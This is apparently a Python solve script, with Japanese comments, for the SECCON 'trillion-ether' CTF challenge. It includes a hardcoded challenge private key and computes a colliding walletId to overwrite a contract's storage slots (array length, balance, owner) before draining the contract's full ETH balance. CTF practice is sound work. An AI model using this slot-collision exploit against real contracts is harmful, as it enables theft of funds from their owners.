from web3 import Web3
from web3.middleware import geth_poa_middleware
from eth_utils import keccak
import time

# ブロックチェーンに接続
rpc_endpoint = 'http://trillion-ether.seccon.games:8545/4e1148e6-ebd4-41f4-a47a-b03ca050e0f1'
w3 = Web3(Web3.HTTPProvider(rpc_endpoint))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)

# アカウントの設定
private_key = '367e5602bfc6cd98d30c479d16904a59794276cdcbdfee38e454799d56a1e29b'
account = w3.eth.account.from_key(private_key)
w3.eth.default_account = account.address

print('あなたのアドレス:', account.address)

# コントラクトの設定
contract_address = '0x71996F774738F44869f8d430Eef2747009BadC78'

# コントラクトのABI（必要な関数のみ）
contract_abi = [
    {
        "inputs": [{"internalType": "bytes32", "name": "name", "type": "bytes32"}],
        "name": "createWallet",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function",
    },
    {
        "inputs": [
            {"internalType": "uint256", "name": "walletId", "type": "uint256"},
            {"internalType": "uint256", "name": "amount", "type": "uint256"}
        ],
        "name": "withdraw",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "isSolved",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "view",
        "type": "function",
    },
]

contract = w3.eth.contract(address=contract_address, abi=contract_abi)

# モジュラ逆数の計算（3の逆数 mod 2**256）
def modinv(a, m):
    g, x, _ = extended_gcd(a, m)
    if g != 1:
        raise Exception('逆数が存在しません')
    else:
        return x % m

def extended_gcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = extended_gcd(b % a, a)
        return (g, x - (b // a) * y, y)

modulus = 2 ** 256
inverse_3 = modinv(3, modulus)

# slot_base = keccak256(0x00...00)
slot_base = int.from_bytes(keccak(b'\x00' * 32), 'big')

# storage slot 1（balance）に対応するwalletIdを計算
desired_slot = 1
field_offset = 1  # balanceは構造体の2番目のフィールド（0から数えて1番目）
walletId = ((desired_slot - slot_base - field_offset) * inverse_3) % modulus

print('計算されたwalletId:', walletId)

# トランザクションを送信する関数
def send_transaction(func, *args, value=0):
    tx = func(*args).build_transaction({
        'chainId': w3.eth.chain_id,
        'from': account.address,
        'nonce': w3.eth.get_transaction_count(account.address),
        'gas': 500000,
        'maxFeePerGas': w3.to_wei('100', 'gwei'),
        'maxPriorityFeePerGas': w3.to_wei('2', 'gwei'),
        'value': value
    })
    signed_tx = w3.eth.account.sign_transaction(tx, private_key=private_key)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    print(f'トランザクションを送信しました: {tx_hash.hex()}')
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print('トランザクションが承認されました')
    time.sleep(1)  # ノンスの問題を避けるため

# storage slot 0（wallets.length）を上書き
large_length = (2 ** 256) - 1  # wallets.lengthを大きな値に設定
send_transaction(contract.functions.createWallet, large_length.to_bytes(32, byteorder='big'), value=0)

# storage slot 1（balance）を上書き
send_transaction(contract.functions.createWallet, b'\x00' * 32, value=0)

# storage slot 2（owner）を自分のアドレスに設定
# アドレスを32バイトに変換
owner_bytes = bytes.fromhex(account.address[2:].rjust(64, '0'))
send_transaction(contract.functions.createWallet, owner_bytes, value=0)

# コントラクトの残高を取得
contract_balance = w3.eth.get_balance(contract_address)
print(f'コントラクトの残高: {w3.from_wei(contract_balance, "ether")} ETH')

# コントラクトの残高を引き出す
send_transaction(contract.functions.withdraw, walletId, contract_balance)

# チャレンジが解決されたか確認
is_solved = contract.functions.isSolved().call()
print('チャレンジが解決されましたか？', is_solved)

